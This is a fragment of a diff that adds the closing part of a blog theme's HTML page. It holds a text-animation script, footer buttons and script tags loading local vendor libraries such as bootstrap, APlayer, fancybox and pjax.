+      d = 75,
+      b = ["rgb(110,64,170)", "rgb(150,61,179)", "rgb(191,60,175)", "rgb(228,65,157)", "rgb(254,75,131)", "rgb(255,94,99)", "rgb(255,120,71)", "rgb(251,150,51)", "rgb(226,183,47)", "rgb(198,214,60)", "rgb(175,240,91)", "rgb(127,246,88)", "rgb(82,246,103)", "rgb(48,239,130)", "rgb(29,223,163)", "rgb(26,199,194)", "rgb(35,171,216)", "rgb(54,140,225)", "rgb(76,110,219)", "rgb(96,84,200)"],
+      c = {
+        text: "",
+        prefixP: -s,
+        skillI: 0,
+        skillP: 0,
+        direction: "forward",
+        delay: a,
+        step: g
+      };
+      i()
+      };
+      binft(document.getElementById('binft'));
+  </script>
+                    </ul>
+                </div>
+            </div>
+        </div>
+        <div class="kr-tool text-center">
+            <div class="tool">
+                
+                    <div class="box search-box">
+                        <a href="/search/">
+                            <span class="fa fa-search"></span>
+                        </a>
+                    </div>
+                
+                
+                    <div class="box theme-box" id="darkmode-switch">
+                        <span class="fa fa-adjust"></span>
+                    </div>
+                
+                
+            </div>
+            <div class="box gotop-box">
+                <span class="fa fa-chevron-up"></span>
+            </div>
+        </div>
+    </div>
+</footer>
+</div>
+</div>
+
+
+        <script defer src="/vendors/bootstrap@3.3.4/dist/js/bootstrap.min.js"></script>
+<script defer src="/vendors/nprogress@0.2.0/nprogress.js"></script>
+<script>
+    if (!window.kr) {
+        window.kr = {};
+    }
+    window.kr.notMobile = (!(navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i)));
+    window.kr.siteRoot = "/";
+</script>
+
+    <div>
+        <canvas id="snow"></canvas>
+        <script async src="/js/snow.min.js"></script>
+    </div>
+
+
+    <script async src="/js/candy.min.js"></script>
+
+
+
+    <script defer src="/vendors/aplayer@1.10.1/dist/APlayer.min.js"></script>
+    
+    <script defer src="/vendors/meting@2.0.1/dist/Meting.min.js"></script>
+    <meting-js
+        server="netease"
+        type="playlist"
+        id="7733928587"
+        order="random"
+        fixed="true"
+    >
+    </meting-js>
+
+
+
+    <script defer src="/vendors/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js"></script>
+
+<script defer src="/vendors/clipboard@2.0.6/dist/clipboard.min.js"></script>
+<script defer src="/js/kratosr.min.js"></script>
+<script defer src="/js/pjax.min.js"></script>
+
+    <script defer src="/vendors/layui-src@2.5.5/dist/layui.all.js"></script>
+
+
+
+<!-- Extra support for third-party plguins  -->
+
+
+
+    </body>
+</html>
